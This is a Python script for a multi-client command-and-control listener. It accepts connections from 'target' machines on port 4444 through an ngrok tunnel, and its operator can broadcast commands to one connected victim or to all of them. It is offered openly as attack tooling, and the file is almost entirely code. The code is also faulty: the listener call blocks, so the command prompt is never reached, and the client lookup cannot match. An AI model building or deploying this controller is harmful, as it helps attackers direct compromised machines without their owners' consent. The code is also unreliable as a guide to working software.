"""
Listener starts by using ngrok tcp 4444 to create a tunnel to the targets machine. 
It then listens for incoming connections on the specified port and handles them accordingly.

"""

import socket
import threading


# Define IP and port to listen on
IP = "0.0.0.0" # Host IP
PORT = 4444 # Port for conenction

# Dictionary to store connected clients
clients = {}

# Function to handle incoming client connections
# This function will be responsible for receiving data from the client and processing it as needed
# Precondition: There is an incoming client connection to the listener.
# Postcondition: The function will receive data from the client, anad handle it accordingly. 

def handle_client(client_socket, client_address):
  print(f'[*] Connection made with: {client_address}') # Print a message indicating that a connection has been accepted from client
  with client_socket as sock:
    try:
      while True:
          if not sock: break # If socket is closed, break loop to end function

          request = sock.recv(4096) # Receive data from the client 
          requestInString = request.decode("utf-8") # Reformat
          print(f'[*] Received: {requestInString}') # Print the received data from client
          
          #To Exit
          if requestInString[:4] == "exit": # If received data is "exit", close connection with client
            print(f'[*] Closing connection with {client_address}') # Print message
            del clients[client_address] # Remove client from clients dictionary
            return # Exit function to close connection with client
          


          sock.send(b'ACK') # Send acknowledgment back to client to confirm receipt of data

    except:
      pass
    finally: 
      sock.close()
      if client_address in clients: del clients[client_address]



# Create a TCP server (listener) and bind it to the specified IP and port
# Identify all connected target cients in the dictionary for accessability
# Listen on port for client connections, then use a thread (from threading library) to handle them simultaneously
# All connected clients will be stored in a dictionary for easy access and management
# The handle_client function will be responsible for receiving data from the client and processing it as needed
# Precondition: The listener is set up and running in python as well as ngrok is activated to create a tunnel to the target machine.
# Postcondition: The listener will be able to handle multiple client connections simultaneously 
# and print the received data from each client.
# 
def start_listener():
  # Creates a TCP server and bind it to IP and PORT
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
    listener.bind((IP, PORT))
    listener.listen()

    # Prints connection
    print(f'[*] Server listening on {IP}:{PORT}')

    while True:
      sock, addr = listener.accept() # Accept client connection
      thread = threading.Thread(target = handle_client, args = (sock, addr)) # Create new thread to handle connection
      thread.start() # Start thread to handle the client connection 
      
      clients[addr] = sock # Store client connection in dictionary

      print(f'[*] Number of connected clients: {len(clients)}') # Print number of connected clients









# Run starat_listener
if __name__ == "__main__":
  print("[*] Starting listener...") # Print a message indicating that the listener is starting
  print("Commands Inputs: 'exit' to close connection with a client")
  print("/[address] [command] to send a command to a specific client")
  print("/all [command] to send a command to all clients")
  start_listener()
  while True: 
    input = input("Enter command to send to clients: ") # Prompt user to enter a command
    # Check for / command to send to clients
    if (input[0]== '/'):
      if (input[1:4] == "all"):
        command = input[5:] # Extract command from input
        for client in clients.values(): 
          client.send(command.encode("utf-8")) # Send command to each client
      else:
        address, command = input[1:].split(" ", 1) # Extract address and command from input
        if address in clients: 
          clients[address].send(command.encode("utf-8")) 
        else:
          print(f'[*] No client found with address {address}') # Print a message indicating that no client was found with specified address

    pass # Keep main thread running to allow listener to continue accepting connections





